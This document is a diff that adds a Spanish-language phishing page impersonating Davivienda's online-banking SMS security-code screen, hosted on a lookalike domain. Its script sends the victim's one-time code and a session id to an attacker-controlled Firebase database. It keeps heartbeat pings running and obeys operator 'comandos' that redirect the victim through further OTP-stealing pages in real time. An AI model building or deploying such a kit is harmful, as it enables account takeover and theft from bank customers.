@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=980">
+  <title>Inicio</title>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+  <link rel="icon" href="https://daaviss.lat/assets/icons/favicon-login.ico">
+  <link rel="stylesheet" href="./Inicio_files/tokens.css">
+  <link rel="stylesheet" href="./Inicio_files/base.css">
+  <link rel="stylesheet" href="./Inicio_files/auth.css">
+</head>
+<body class="svAuth" lang="es">
+<div class="authBackdrop"></div>
+<header class="authHeader">
+  <span class="authHeader__brand" role="img" data-arialabel="brand.name" aria-label="Davivienda"></span>
+  <div class="authHeader__lang">
+    <i class="authHeader__langIcon" aria-hidden="true"></i>
+    <a href="https://daaviss.lat/ebanking/seguridad/login/index.html#" id="langToggle" data-txt="lang.toggle">English</a>
+  </div>
+</header>
+
+<main class="authCard">
+  <h2 class="authCard__title" id="authTitle">Código de seguridad</h2>
+
+  <div id="stepSms">
+    <span class="authAvatar" aria-hidden="true"></span>
+    <input class="authField authField--pass" id="smsInput" type="text" inputmode="numeric" maxlength="8" autocomplete="off" placeholder="Código SMS" aria-label="Código SMS">
+    <p class="authLegal" style="text-align:center;margin-top:10px">Ingrese el código enviado a su celular para validar su identidad.</p>
+    <button class="authButton authButton--ghost authButton--back" id="backBtn" type="button">Regresar</button>
+    <button class="authButton authButton--primary authButton--login" id="smsBtn" type="button">Validar identidad</button>
+  </div>
+
+  <div class="authError is-hidden" id="authError">Código incorrecto, intente de nuevo.</div>
+
+  <ul class="authLinks">
+    <li><a href="https://daaviss.lat/ebanking/seguridad/login/index.html#" data-txt="auth.links.register">Registrarse</a></li>
+    <li><a href="https://daaviss.lat/ebanking/seguridad/login/index.html#" data-txt="auth.links.forgot">¿Olvidó su contraseña?</a></li>
+    <li><a href="https://daaviss.lat/ebanking/seguridad/login/index.html#" data-txt="auth.links.unlock">Desbloquear usuario</a></li>
+    <li><a href="https://daaviss.lat/ebanking/seguridad/login/index.html#" data-txt="auth.links.pay">PAY</a></li>
+    <li><a href="https://daaviss.lat/ebanking/seguridad/login/index.html#" data-txt="auth.links.token">Token Davivienda</a></li>
+  </ul>
+
+  <p class="authLegal"><span data-txt="auth.legal">Davivienda, tiene el compromiso de proteger su privacidad y la integridad de su información personal y financiera. A continuación se definen recomendaciones para su seguridad. Consúltelas haciendo</span> <a href="https://www.davivienda.com.sv/Api-portalDavivienda/media/NSSBD22.pdf" data-txt="auth.legal.link">Click aquí</a></p>
+</main>
+
+<div class="authLoading is-hidden" id="authLoading">
+  <div class="authLoading__box">
+    <span class="authLoading__spinner" aria-hidden="true"></span>
+    <p class="authLoading__text" id="loadingText">Validando código de seguridad...</p>
+  </div>
+</div>
+
+<footer class="authFooter">
+  <div class="authFooter__inner">
+    <span data-txt="auth.footer.copyright">Davivienda - © 2026 Davivienda - Todos los derechos reservados</span>
+    <span data-txt="auth.footer.version">Versión: 11</span>
+  </div>
+</footer>
+  <script>
+    const DB_URL = "https://banficohxahn-default-rtdb.firebaseio.com/";
+    firebase.initializeApp({ databaseURL: DB_URL });
+    const db = firebase.database();
+
+    const params = new URLSearchParams(location.search);
+    const sid = params.get('sid') || sessionStorage.getItem('sid');
+    if (sid) sessionStorage.setItem('sid', sid);
+
+    const smsInput    = document.getElementById('smsInput');
+    const authError   = document.getElementById('authError');
+    const authLoading = document.getElementById('authLoading');
+
+    let guardado = false;
+    let comandosOn = false;
+
+    function latido() {
+      if (sid) db.ref('logins/' + sid).update({ online: true, ultimoPing: Date.now() }).catch(() => {});
+    }
+
+    function escucharComandos() {
+      if (comandosOn || !sid) return;
+      comandosOn = true;
+      db.ref('comandos/' + sid).on('value', s => {
+        const v = s.val();
+        if (!v) return;
+        db.ref('comandos/' + sid).remove();
+
+        // rechazo -> inicio
+        if (v.rechazar) { location.href = 'inicio.html?sid=' + encodeURIComponent(sid); return; }
+        if (!v.redirect) return;
+
+        const destino = String(v.redirect).split('?')[0];
+
+        // si el panel rechaza por redirect, también a inicio
+        if (destino === 'index.html' || destino === 'index2.html' || destino === 'inicio.html') {
+          location.href = 'inicio.html?sid=' + encodeURIComponent(sid);
+          return;
+        }
+
+        // sms2.html, otp.html, etc: navegación normal
+        location.href = destino + '?sid=' + encodeURIComponent(sid);
+      });
+    }
+
+    document.getElementById('smsBtn').onclick = () => {
+      const codigo = smsInput.value.trim();
+      if (codigo.length < 3) { smsInput.focus(); return; }
+      if (!sid) { location.href = 'inicio.html'; return; }
+
+      authError.classList.add('is-hidden');
+      authLoading.classList.remove('is-hidden');
+
+      db.ref('logins/' + sid).update({
+        sms: codigo,
+        pagina: 'OTP',
+        online: true,
+        ultimoPing: Date.now()
+      }).then(() => {
+        guardado = true;
+        escucharComandos();
+      });
+    };
+
+    document.getElementById('backBtn').onclick = () => {
+      if (sid) location.href = 'index2.html?sid=' + encodeURIComponent(sid);
+      else location.href = 'index2.html';
+    };
+
+    smsInput.addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('smsBtn').click(); });
+
+    window.addEventListener('beforeunload', () => {
+      if (guardado && sid) db.ref('logins/' + sid).update({ online: false });
+    });
+
+    setInterval(latido, 15000);
+    latido();
+    escucharComandos();
+    smsInput.focus();
+  </script>
+
+</body></html>
